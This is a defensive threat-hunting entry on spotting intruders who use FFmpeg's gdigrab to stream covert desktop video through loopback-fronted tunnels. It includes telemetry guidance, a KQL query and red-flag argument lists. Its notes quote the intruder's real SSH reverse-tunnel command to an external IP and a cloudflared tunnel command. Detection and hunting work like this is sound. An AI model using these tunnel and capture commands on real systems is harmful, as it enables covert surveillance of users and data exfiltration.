false_positive_notes: |
  FFmpeg is ubiquitous and overwhelmingly benign: it ships inside or alongside OBS Studio, Handbrake, Plex, Jellyfin, Audacity, Blender, Chrome and Firefox, countless Electron applications, video conferencing clients, and virtually every media or streaming workflow. It is also genuinely used for legitimate screen recording — OBS and other capture tools invoke `gdigrab` or `ddagrab` themselves. Do not hunt FFmpeg presence, and do not hunt FFmpeg execution; hunt the conjunction of a screen-capture input device with an unmanaged binary path, an unexpected parent, and a network destination. Legitimate capture runs as a child of a recognisable application (`obs64.exe`, a conferencing client, a build or render pipeline), writes to a user's Videos or project directory, and is initiated during an interactive session by the console user. The malicious pattern in the source report ran from an operator's remote session, was fetched ad hoc from a third-party build site rather than installed, and streamed to a loopback port fronted by a tunnel instead of writing a file. On servers, domain controllers, jump hosts and VDI infrastructure, `gdigrab` execution has essentially no legitimate explanation and should be treated as reportable on its own. Expect a media or marketing team to generate real hits; inventory those users and hosts first. Renaming `ffmpeg.exe` is trivial, so pair the filename leg with the argument-grammar and ImageLoad legs below rather than relying on the name.
notes: |
  Platform: Windows. Driven by the Deception.Pro operational report "[Op Report] KongTuke ClickFix to SystemBC: HoK Intrusion" (September 2026), which records FFmpeg fetched from `gyan.dev` and used for "FFmpeg screen capture via gdigrab streamed to reverse tunnel" inside an intrusion that also ran a Chisel SOCKS client, an SSH reverse tunnel (`ssh -N -T -R *:1080 root@77.91.123.131 -p 443`), and Cloudflare Tunnel (`cloudflared tunnel --url http://127.0.0.1:<port> --protocol http2`), moving 5+ GB out over TLS.
  Why this evades screen-capture detection - Almost every screen-capture detection assumes one of two shapes: a RAT module calling `BitBlt`/`GetDC`/`PrintWindow` from injected or unsigned code, or image files appearing on disk (`.png`, `.jpg`, `.bmp` in `%TEMP%` or a staging folder). FFmpeg's `gdigrab` device does the capture inside a signed, legitimate, widely-installed third-party binary, and streaming the output means no image files are ever written. The result is continuous video surveillance of the console — far higher fidelity than periodic screenshots — produced by a process most EDR tuning explicitly allowlists for performance reasons.
  Sysmon Event ID 1 / 4688 / DeviceProcessEvents — argument grammar (durable, survives renaming) - Core filter: any process whose command line contains `gdigrab` or `ddagrab`, or contains `-i desktop` or `-i title=`. FFmpeg's `-f <device> -i <input>` grammar is required by the tool, so it survives a rename of the executable. Triage fields: `ProcessCommandLine`, `FolderPath`, `AccountName`, `InitiatingProcessFileName`, `InitiatingProcessCommandLine`, `SHA256`, session ID. Strong red flags: output target is a URL scheme rather than a file — `rtmp://`, `rtsp://`, `udp://`, `tcp://`, `http://127.0.0.1:<port>`, or `-` piped onward; `-f mpegts` or `-f flv` streaming muxers rather than `-f mp4`; framerate and scaling flags tuned for low bandwidth (`-r 1` through `-r 5`, `-vf scale=`, `-preset ultrafast`, `-tune zerolatency`, `-q:v` high values); `-loglevel quiet` or `-nostats` suppressing console output; `-t` absent so capture runs indefinitely; and the binary sitting in `%TEMP%`, `%APPDATA%`, `%LOCALAPPDATA%`, `C:\Users\Public`, `C:\ProgramData` or `C:\PerfLogs` rather than a managed application directory.
  Sample KQL — screen-capture input device with a streaming destination:
  `DeviceProcessEvents | where Timestamp > ago(30d) | where ProcessCommandLine has_any ("gdigrab", "ddagrab") or ProcessCommandLine has "-i desktop" | extend streaming = ProcessCommandLine has_any ("rtmp://", "rtsp://", "udp://", "tcp://", "127.0.0.1", "pipe:") | extend unmanaged = FolderPath has_any (@"\Temp\", @"\AppData\", @"\Users\Public", @"\ProgramData\", @"\PerfLogs") | project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256, streaming, unmanaged | order by Timestamp desc`
  Parent-process lineage - Core filter: the parent of the capture process. Legitimate `gdigrab` has a recognisable application parent; the malicious case is parented by `cmd.exe`, `powershell.exe`, `node.exe`, `conhost.exe`, an RMM agent, a PsExec service, or a shell spawned inside an RDP session. Strong red flag: the process runs in a session other than the console user's, or under a service account, meaning something is recording a screen its owner is not watching. Correlate the session ID against Event ID 4624 logon type 10 (RemoteInteractive) to establish whether the operator was watching the console user work — in the source intrusion the operator was interactive from workstation `WIN-HQ8EO8P8GBF`.
  Sysmon Event ID 3 / DeviceNetworkEvents — the tunnel leg - Core filter: the capture process connecting to `127.0.0.1` or `::1` on a high port, which is the shape when the stream is handed to a local tunnel client rather than sent directly. Then pivot to whatever process is listening on that port and follow *its* egress. Strong red flags: a sibling `ssh.exe` with `-R` (remote port forward), `chisel.exe`, or `cloudflared.exe` running concurrently on the same host; sustained outbound TLS to a single external IP for hours at a steady bitrate, which is the distinctive volumetric signature of a live video stream and is quite unlike file exfiltration's burst-then-stop shape; and TLS SNI to `trycloudflare.com`, `argotunnel.com` or `cftunnel.com` in the same window. Note that Sysmon Event ID 3 must be explicitly configured to log loopback connections — many default configurations exclude `127.0.0.1`, which silently removes the most useful leg of this hunt, so verify your configuration before concluding there is nothing to find.
  Sysmon Event ID 7 (ImageLoad) — catching the rename - Core filter: a process loading `avcodec-*.dll`, `avformat-*.dll`, `avdevice-*.dll`, `avutil-*.dll` or `swscale-*.dll` where the loading image is not a known media application. FFmpeg's shared-build DLLs keep their names even when the executable is renamed, and `avdevice` specifically is the module that provides `gdigrab` — its presence is a strong indication of capture capability regardless of what the binary is called. See [[H178]] for the related but distinct case of a trojanized `ffmpeg.dll` used for sideloading rather than capture.
  Download provenance - Core filter: proxy or DNS records for `gyan.dev`, `www.gyan.dev`, `github.com/BtbN/FFmpeg-Builds`, `ffmpeg.org` or `evermeet.cx` from a host with no media workflow, correlated with a subsequent archive extraction (Sysmon Event ID 11 creating `ffmpeg.exe` plus the `av*.dll` set) within minutes. These are legitimate FFmpeg distribution points, so this is a provenance signal rather than an indicator — its value is that an ad hoc download immediately preceding first-ever execution on a server is a very different pattern from a managed install.
  Cross-technique: pair with [[H346]] and [[H344]] for other legs of this intrusion's tooling, and with [[M052]] for tunnelled C2 encoding analysis. The report's other tunnel artifacts overlap [[H263]] (Cloudflare Tunnel installed as a service) — run that hunt alongside this one, since the tunnel and the capture are separate detection opportunities on the same host.

# H342

The Deception.Pro operational report on a KongTuke ClickFix intrusion that ended in SystemBC and AdaptixC2 records an unusually direct piece of tradecraft among a long list of tooling: FFmpeg, downloaded from the third-party build site `gyan.dev`, used with its `gdigrab` input device to capture the desktop and stream the result out through a reverse tunnel. In the same intrusion the operator maintained an SSH reverse tunnel, a Chisel SOCKS client and a Cloudflare Tunnel, and moved more than 5 GB of data out over TLS while working interactively from their own workstation.

Using FFmpeg for surveillance is a deliberate downgrade in tooling and an upgrade in evasion. A RAT's screen-capture module is code the defender's EDR can learn: it calls `BitBlt` or `PrintWindow` from an unsigned or injected image, and it usually writes image files somewhere. FFmpeg does the same capture inside a signed, legitimate binary that is installed on a substantial fraction of all Windows machines and that most EDR tuning explicitly allowlists because it is noisy and performance-sensitive. Streaming the output rather than recording it means nothing is written to disk at all — no screenshots to find during triage, and no evidence of what the operator saw beyond the fact that a stream existed.

What it produces is also better than screenshots. Continuous video of the console shows the operator exactly what an administrator types, which internal applications exist, how authentication flows work and what MFA prompts look like — reconnaissance that no file collection provides. The detectable property is that `gdigrab` is an unusual argument for a media tool, that a streaming destination is an unusual output for it, and that a server has no reason to run either.

## Why

- This defeats the two assumptions most screen-capture detections are built on. There is no unsigned module calling graphics APIs and there are no image files on disk, so both the behavioural and the artifact-based detection paths come up empty while high-fidelity surveillance runs continuously inside an allowlisted process.
- The argument grammar is forced by the tool and therefore durable. `gdigrab` must be named to use it and `-i desktop` must follow, so the query survives renaming the executable, recompiling it, or embedding it in a wrapper — unlike a filename or hash rule, which this actor's broader tradecraft shows they would defeat.
- Loopback plus tunnel is the structural signature and it is queryable from first-party telemetry. Because the capture process talks to `127.0.0.1` and a separate tunnel client carries the traffic out, the pair is visible in Sysmon Event ID 3 — provided loopback logging is enabled, which is itself a configuration gap worth discovering during this hunt.
- Video has a volumetric fingerprint distinct from exfiltration. A steady bitrate sustained for hours to one external endpoint looks nothing like the burst-and-stop profile of file transfer, so network telemetry alone can separate live surveillance from data theft and tell an incident responder what the operator was actually doing.
- Context makes this nearly false-positive-free where it matters most. FFmpeg on a designer's workstation is unremarkable; `gdigrab` on a domain controller, jump host, file server or VDI broker has no legitimate explanation at all, which is precisely the population an interactive intruder targets.
